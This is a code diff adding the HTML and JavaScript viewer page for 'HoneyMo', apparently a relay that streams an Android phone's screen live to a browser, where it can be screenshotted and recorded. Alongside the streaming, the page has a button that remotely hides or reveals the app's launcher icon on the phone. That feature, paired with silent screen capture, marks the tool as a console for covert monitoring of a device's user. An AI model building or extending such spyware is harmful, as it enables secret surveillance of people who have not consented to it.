@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HoneyMo - Live Screen Capture Stream</title>
+  <script src="/jmuxer.min.js"></script>
+  <style>
+    :root {
+      --bg-primary: #0f172a;
+      --bg-secondary: #1e293b;
+      --bg-tertiary: #334155;
+      --text-primary: #f8fafc;
+      --text-secondary: #94a3b8;
+      --accent-green: #10b981;
+      --accent-red: #ef4444;
+      --accent-blue: #3b82f6;
+      --accent-purple: #8b5cf6;
+      --accent-amber: #f59e0b;
+      --border-color: #334155;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+      background-color: var(--bg-primary);
+      color: var(--text-primary);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    header {
+      background-color: var(--bg-secondary);
+      border-bottom: 1px solid var(--border-color);
+      padding: 1rem 1.5rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 1rem;
+    }
+
+    .logo-section {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+    }
+
+    .logo-icon {
+      width: 36px;
+      height: 36px;
+      background: linear-gradient(135deg, #6366f1, #8b5cf6);
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.25rem;
+    }
+
+    .logo-text h1 {
+      font-size: 1.2rem;
+      font-weight: 700;
+      letter-spacing: -0.025em;
+    }
+
+    .logo-text p {
+      font-size: 0.75rem;
+      color: var(--text-secondary);
+    }
+
+    .header-badges {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+    }
+
+    .status-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      padding: 0.4rem 0.85rem;
+      border-radius: 9999px;
+      font-size: 0.85rem;
+      font-weight: 600;
+      background-color: rgba(239, 68, 68, 0.15);
+      color: var(--accent-red);
+      border: 1px solid rgba(239, 68, 68, 0.3);
+      transition: all 0.3s ease;
+    }
+
+    .status-badge.connected {
+      background-color: rgba(16, 185, 129, 0.15);
+      color: var(--accent-green);
+      border-color: rgba(16, 185, 129, 0.3);
+    }
+
+    .status-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background-color: currentColor;
+    }
+
+    .status-badge.connected .status-dot {
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(0.95); opacity: 0.8; }
+      50% { transform: scale(1.3); opacity: 1; }
+      100% { transform: scale(0.95); opacity: 0.8; }
+    }
+
+    main {
+      flex: 1;
+      padding: 1.5rem;
+      display: flex;
+      flex-direction: column;
+      gap: 1.25rem;
+      max-width: 1400px;
+      margin: 0 auto;
+      width: 100%;
+    }
+
+    /* Metrics Grid */
+    .metrics-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      gap: 1rem;
+    }
+
+    .metric-card {
+      background-color: var(--bg-secondary);
+      border: 1px solid var(--border-color);
+      border-radius: 12px;
+      padding: 1rem 1.25rem;
+      display: flex;
+      flex-direction: column;
+      gap: 0.25rem;
+    }
+
+    .metric-title {
+      font-size: 0.75rem;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      color: var(--text-secondary);
+    }
+
+    .metric-value {
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: var(--text-primary);
+    }
+
+    .metric-sub {
+      font-size: 0.75rem;
+      color: var(--text-secondary);
+    }
+
+    /* Player Container */
+    .player-container {
+      background-color: #000;
+      border: 1px solid var(--border-color);
+      border-radius: 16px;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+      min-height: 520px;
+      box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
+    }
+
+    .player-screen-wrapper {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: radial-gradient(circle, #1a2333 0%, #080d16 100%);
+      position: relative;
+      min-height: 480px;
+    }
+
+    #player {
+      max-width: 100%;
+      max-height: 75vh;
+      object-fit: contain;
+      display: none;
+    }
+
+    #player.active {
+      display: block;
+    }
+
+    .player-placeholder {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 1rem;
+      color: var(--text-secondary);
+      text-align: center;
+      padding: 2rem;
+    }
+
+    .player-placeholder svg {
+      width: 64px;
+      height: 64px;
+      color: var(--text-secondary);
+      opacity: 0.5;
+    }
+
+    .player-placeholder h3 {
+      font-size: 1.25rem;
+      color: var(--text-primary);
+    }
+
+    .player-placeholder p {
+      max-width: 420px;
+      font-size: 0.9rem;
+      line-height: 1.5;
+    }
+
+    .instructions-box {
+      background-color: var(--bg-secondary);
+      border: 1px solid var(--border-color);
+      border-radius: 8px;
+      padding: 0.75rem 1rem;
+      font-family: monospace;
+      font-size: 0.85rem;
+      color: var(--accent-blue);
+      margin-top: 0.5rem;
+    }
+
+    /* Controls Bar */
+    .player-controls {
+      background-color: var(--bg-secondary);
+      border-top: 1px solid var(--border-color);
+      padding: 0.75rem 1.25rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 0.75rem;
+    }
+
+    .btn-group {
+      display: flex;
+      gap: 0.5rem;
+    }
+
+    button {
+      background-color: var(--bg-tertiary);
+      color: var(--text-primary);
+      border: 1px solid var(--border-color);
+      padding: 0.5rem 0.9rem;
+      border-radius: 8px;
+      font-size: 0.85rem;
+      font-weight: 500;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      transition: all 0.2s ease;
+    }
+
+    button:hover:not(:disabled) {
+      background-color: #475569;
+      border-color: #64748b;
+    }
+
+    button:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    button.btn-primary {
+      background-color: var(--accent-blue);
+      border-color: var(--accent-blue);
+    }
+
+    button.btn-primary:hover:not(:disabled) {
+      background-color: #2563eb;
+    }
+
+    button.btn-danger {
+      background-color: var(--accent-red);
+      border-color: var(--accent-red);
+    }
+
+    /* Logs section */
+    .logs-card {
+      background-color: var(--bg-secondary);
+      border: 1px solid var(--border-color);
+      border-radius: 12px;
+      padding: 1rem;
+      display: flex;
+      flex-direction: column;
+      gap: 0.5rem;
+    }
+
+    .logs-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 0.85rem;
+      font-weight: 600;
+    }
+
+    .logs-content {
+      background-color: #090d16;
+      border: 1px solid var(--border-color);
+      border-radius: 8px;
+      padding: 0.75rem;
+      font-family: monospace;
+      font-size: 0.8rem;
+      height: 120px;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 0.25rem;
+    }
+
+    .log-line {
+      color: var(--text-secondary);
+    }
+    .log-line.info { color: var(--accent-blue); }
+    .log-line.success { color: var(--accent-green); }
+    .log-line.warn { color: var(--accent-amber); }
+    .log-line.error { color: var(--accent-red); }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="logo-section">
+      <div class="logo-icon">📱</div>
+      <div class="logo-text">
+        <h1>HoneyMo Screen Viewer</h1>
+        <p>Real-Time Android MediaProjection Relay</p>
+      </div>
+    </div>
+
+    <div class="header-badges">
+      <div id="deviceBadge" class="status-badge">
+        <span class="status-dot"></span>
+        <span id="deviceStatusText">Device Offline</span>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    <!-- Live Metrics Grid -->
+    <div class="metrics-grid">
+      <div class="metric-card">
+        <span class="metric-title">Framerate</span>
+        <span id="fpsVal" class="metric-value">0 <small style="font-size: 0.85rem; font-weight: normal;">fps</small></span>
+        <span id="fpsSub" class="metric-sub">Target: 30 fps</span>
+      </div>
+
+      <div class="metric-card">
+        <span class="metric-title">Bitrate</span>
+        <span id="bitrateVal" class="metric-value">0 <small style="font-size: 0.85rem; font-weight: normal;">kbps</small></span>
+        <span id="bitrateSub" class="metric-sub">Hardware H.264</span>
+      </div>
+
+      <div class="metric-card">
+        <span class="metric-title">Resolution</span>
+        <span id="resVal" class="metric-value">-- x --</span>
+        <span id="deviceModelVal" class="metric-sub">Waiting for device...</span>
+      </div>
+
+      <div class="metric-card">
+        <span class="metric-title">Transferred</span>
+        <span id="trafficVal" class="metric-value">0 <small style="font-size: 0.85rem; font-weight: normal;">MB</small></span>
+        <span id="framesVal" class="metric-sub">0 frames decoded</span>
+      </div>
+    </div>
+
+    <!-- Video Player Display -->
+    <div class="player-container">
+      <div class="player-screen-wrapper" id="playerWrapper">
+        <video id="player" autoplay playsinline muted></video>
+
+        <div id="placeholder" class="player-placeholder">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 18h.01M7 21h10a2 2 0 002-2V5a2 2 0 00-2-2H7a2 2 0 00-2 2v14a2 2 0 002 2z"></path>
+          </svg>
+          <h3>Waiting for Screen Stream</h3>
+          <p>Open the HoneyMo app on your Android device, enter this server address, and tap <strong>Start Capture</strong>.</p>
+          <div class="instructions-box" id="serverWsUrl">ws://&lt;your-ip&gt;:3000/ws/device</div>
+        </div>
+      </div>
+
+      <div class="player-controls">
+        <div class="btn-group">
+          <button id="btnKeyframe" title="Request an immediate I-Frame from device">
+            🔄 Request Keyframe
+          </button>
+          <button id="btnRevealIcon" title="Remotely unhide HoneyMo launcher icon on Android device">
+            👁️ Reveal App Icon
+          </button>
+          <button id="btnSnapshot" title="Download snapshot image">
+            📸 Take Screenshot
+          </button>
+          <button id="btnRecord" title="Record live stream">
+            🔴 Record Stream
+          </button>
+        </div>
+
+        <div class="btn-group">
+          <button id="btnFullscreen" class="btn-primary" title="Toggle Fullscreen">
+            ⛶ Fullscreen
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Connection Logs -->
+    <div class="logs-card">
+      <div class="logs-header">
+        <span>Activity Log</span>
+        <button id="btnClearLogs" style="padding: 0.2rem 0.6rem; font-size: 0.75rem;">Clear</button>
+      </div>
+      <div class="logs-content" id="logContainer"></div>
+    </div>
+  </main>
+
+  <script>
+    const video = document.getElementById('player');
+    const placeholder = document.getElementById('placeholder');
+    const deviceBadge = document.getElementById('deviceBadge');
+    const deviceStatusText = document.getElementById('deviceStatusText');
+    const fpsVal = document.getElementById('fpsVal');
+    const bitrateVal = document.getElementById('bitrateVal');
+    const resVal = document.getElementById('resVal');
+    const deviceModelVal = document.getElementById('deviceModelVal');
+    const trafficVal = document.getElementById('trafficVal');
+    const framesVal = document.getElementById('framesVal');
+    const logContainer = document.getElementById('logContainer');
+    const serverWsUrlBox = document.getElementById('serverWsUrl');
+
+    const btnKeyframe = document.getElementById('btnKeyframe');
+    const btnRevealIcon = document.getElementById('btnRevealIcon');
+    const btnSnapshot = document.getElementById('btnSnapshot');
+    const btnRecord = document.getElementById('btnRecord');
+    const btnFullscreen = document.getElementById('btnFullscreen');
+    const btnClearLogs = document.getElementById('btnClearLogs');
+
+    // Update connection URL suggestion box
+    const currentHost = window.location.hostname;
+    const currentPort = window.location.port || '3000';
+    serverWsUrlBox.textContent = `ws://${currentHost}:${currentPort}/ws/device`;
+
+    function log(msg, type = 'normal') {
+      const line = document.createElement('div');
+      line.className = `log-line ${type}`;
+      const time = new Date().toLocaleTimeString();
+      line.textContent = `[${time}] ${msg}`;
+      logContainer.appendChild(line);
+      logContainer.scrollTop = logContainer.scrollHeight;
+    }
+
+    btnClearLogs.onclick = () => { logContainer.innerHTML = ''; };
+
+    // Initialize JMuxer player
+    let jmuxer = null;
+
+    function initJMuxer() {
+      if (jmuxer) {
+        try { jmuxer.destroy(); } catch (e) {}
+      }
+      jmuxer = new JMuxer({
+        node: 'player',
+        mode: 'video',
+        flushingTime: 0,
+        clearBuffer: true,
+        fps: 30,
+        debug: false,
+        onError: function(data) {
+          log('JMuxer decode error: ' + JSON.stringify(data), 'warn');
+        }
+      });
+      log('JMuxer H.264 hardware player initialized', 'info');
+    }
+
+    initJMuxer();
+
+    // Low Latency Auto-Catchup:
+    // If browser buffer builds up, jump directly to the live edge!
+    setInterval(() => {
+      if (video && !video.paused && video.buffered.length > 0) {
+        const liveEdge = video.buffered.end(video.buffered.length - 1);
+        const delay = liveEdge - video.currentTime;
+        if (delay > 0.3) {
+          // If buffered more than 300ms behind, skip to live edge for lowest latency (~50-100ms)
+          video.currentTime = liveEdge - 0.05;
+        }
+      }
+    }, 500);
+
+    // WebSocket connection to Node.js backend
+    let ws = null;
+    let isConnected = false;
+
+    function connectViewerWs() {
+      const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+      const url = `${proto}//${window.location.host}/ws/viewer`;
+      log(`Connecting to viewer WebSocket: ${url}`, 'info');
+
+      ws = new WebSocket(url);
+      ws.binaryType = 'arraybuffer';
+
+      ws.onopen = () => {
+        log('Connected to HoneyMo Relay Server', 'success');
+      };
+
+      ws.onmessage = (event) => {
+        if (typeof event.data === 'string') {
+          try {
+            const msg = JSON.parse(event.data);
+            handleControlMessage(msg);
+          } catch (e) {
+            console.error('Error parsing JSON message:', e);
+          }
+        } else if (event.data instanceof ArrayBuffer) {
+          // Received raw H.264 NAL unit
+          const uint8 = new Uint8Array(event.data);
+          
+          if (!video.classList.contains('active')) {
+            video.classList.add('active');
+            placeholder.style.display = 'none';
+          }
+
+          if (jmuxer) {
+            jmuxer.feed({
+              video: uint8,
+              duration: 33 // ~30 fps
+            });
+          }
+        }
+      };
+
+      ws.onclose = () => {
+        log('Viewer WebSocket disconnected. Reconnecting in 2s...', 'warn');
+        setDeviceStatus(false);
+        setTimeout(connectViewerWs, 2000);
+      };
+
+      ws.onerror = (err) => {
+        log('Viewer WebSocket encountered an error', 'error');
+      };
+    }
+
+    let isDeviceIconVisible = true;
+
+    function updateIconToggleButton(visible) {
+      isDeviceIconVisible = !!visible;
+      if (isDeviceIconVisible) {
+        btnRevealIcon.textContent = '🙈 Hide App Icon';
+        btnRevealIcon.title = 'Remotely hide HoneyMo launcher icon on Android device';
+        btnRevealIcon.style.borderColor = 'rgba(239, 68, 68, 0.4)';
+        btnRevealIcon.style.color = 'var(--text-primary)';
+      } else {
+        btnRevealIcon.textContent = '👁️ Reveal App Icon';
+        btnRevealIcon.title = 'Remotely reveal HoneyMo launcher icon on Android device';
+        btnRevealIcon.style.borderColor = 'rgba(99, 102, 241, 0.6)';
+        btnRevealIcon.style.color = '#818cf8';
+      }
+    }
+
+    // Initialize toggle button state
+    updateIconToggleButton(true);
+
+    function handleControlMessage(msg) {
+      if (msg.type === 'INIT_STATUS' || msg.type === 'DEVICE_STATUS') {
+        setDeviceStatus(msg.connected, msg.metadata);
+      } else if (msg.type === 'DEVICE_INFO') {
+        updateDeviceInfo(msg.metadata);
+      } else if (msg.type === 'DEVICE_ICON_STATE') {
+        updateIconToggleButton(msg.isIconVisible);
+        log(`Device launcher icon is now: ${msg.isIconVisible ? 'VISIBLE' : 'HIDDEN'}`, 'info');
+      } else if (msg.type === 'DEVICE_LIST') {
+        if (msg.devices && msg.devices.length > 0 && typeof msg.devices[0].isIconVisible === 'boolean') {
+          updateIconToggleButton(msg.devices[0].isIconVisible);
+        }
+      } else if (msg.type === 'STATS') {
+        updateStats(msg.stats);
+      }
+    }
+
+    function setDeviceStatus(connected, metadata) {
+      if (connected) {
+        deviceBadge.className = 'status-badge connected';
+        deviceStatusText.textContent = 'Device Streaming';
+        log('Android device is connected and active', 'success');
+        if (metadata) updateDeviceInfo(metadata);
+      } else {
+        deviceBadge.className = 'status-badge';
+        deviceStatusText.textContent = 'Device Offline';
+        video.classList.remove('active');
+        placeholder.style.display = 'flex';
+        fpsVal.innerHTML = '0 <small style="font-size: 0.85rem; font-weight: normal;">fps</small>';
+        bitrateVal.innerHTML = '0 <small style="font-size: 0.85rem; font-weight: normal;">kbps</small>';
+        log('Device is offline or disconnected', 'warn');
+      }
+    }
+
+    function updateDeviceInfo(meta) {
+      if (!meta) return;
+      if (meta.width && meta.height) {
+        resVal.textContent = `${meta.width} x ${meta.height}`;
+      }
+      if (meta.deviceName) {
+        deviceModelVal.textContent = `${meta.deviceName} (${meta.androidVersion || 'Android'})`;
+      }
+      if (meta.fps) {
+        document.getElementById('fpsSub').textContent = `Target: ${meta.fps} fps`;
+      }
+      if (typeof meta.isIconVisible === 'boolean') {
+        updateIconToggleButton(meta.isIconVisible);
+      }
+    }
+
+    function updateStats(s) {
+      if (!s) return;
+      fpsVal.innerHTML = `${s.fps} <small style="font-size: 0.85rem; font-weight: normal;">fps</small>`;
+      bitrateVal.innerHTML = `${s.bitrateKbps} <small style="font-size: 0.85rem; font-weight: normal;">kbps</small>`;
+      framesVal.textContent = `${s.totalFrames} frames received`;
+      trafficVal.innerHTML = `${(s.totalBytes / (1024 * 1024)).toFixed(2)} <small style="font-size: 0.85rem; font-weight: normal;">MB</small>`;
+    }
+
+    // Controls
+    btnKeyframe.onclick = () => {
+      if (ws && ws.readyState === WebSocket.OPEN) {
+        ws.send(JSON.stringify({ type: 'REQUEST_KEYFRAME' }));
+        log('Requested immediate keyframe from Android MediaCodec', 'info');
+      }
+    };
+
+    btnRevealIcon.onclick = () => {
+      if (ws && ws.readyState === WebSocket.OPEN) {
+        const targetVisible = !isDeviceIconVisible;
+        ws.send(JSON.stringify({
+          type: 'SET_ICON_VISIBILITY',
+          visible: targetVisible
+        }));
+        const action = targetVisible ? 'Reveal App Icon' : 'Hide App Icon';
+        log(`Sent remote command: ${action} to device`, 'success');
+      } else {
+        log('Cannot send command: Viewer WebSocket is not connected', 'warn');
+      }
+    };
+
+    btnFullscreen.onclick = () => {
+      const elem = document.getElementById('playerWrapper');
+      if (!document.fullscreenElement) {
+        elem.requestFullscreen().catch(err => alert(err.message));
+      } else {
+        document.exitFullscreen();
+      }
+    };
+
+    btnSnapshot.onclick = () => {
+      if (!video || !video.videoWidth) {
+        alert('No active video stream to capture');
+        return;
+      }
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const dataUrl = canvas.toDataURL('image/png');
+      const a = document.createElement('a');
+      a.href = dataUrl;
+      a.download = `honeymo-screen-${Date.now()}.png`;
+      a.click();
+      log('Saved screenshot image', 'success');
+    };
+
+    // Recording feature using MediaStream capture
+    let mediaRecorder = null;
+    let recordedChunks = [];
+
+    btnRecord.onclick = () => {
+      if (!mediaRecorder || mediaRecorder.state === 'inactive') {
+        if (!video || !video.srcObject && !video.captureStream) {
+          alert('Video capture stream not available yet');
+          return;
+        }
+        try {
+          const stream = video.captureStream();
+          recordedChunks = [];
+          mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
+          mediaRecorder.ondataavailable = (e) => {
+            if (e.data.size > 0) recordedChunks.push(e.data);
+          };
+          mediaRecorder.onstop = () => {
+            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `screen-record-${Date.now()}.webm`;
+            a.click();
+            log('Recording downloaded', 'success');
+          };
+          mediaRecorder.start(1000);
+          btnRecord.textContent = '⏹ Stop Recording';
+          btnRecord.classList.add('btn-danger');
+          log('Recording started...', 'info');
+        } catch (e) {
+          alert('Recording failed to start: ' + e.message);
+        }
+      } else {
+        mediaRecorder.stop();
+        btnRecord.textContent = '🔴 Record Stream';
+        btnRecord.classList.remove('btn-danger');
+      }
+    };
+
+    // Start viewer connection
+    connectViewerWs();
+  </script>
+</body>
+</html>
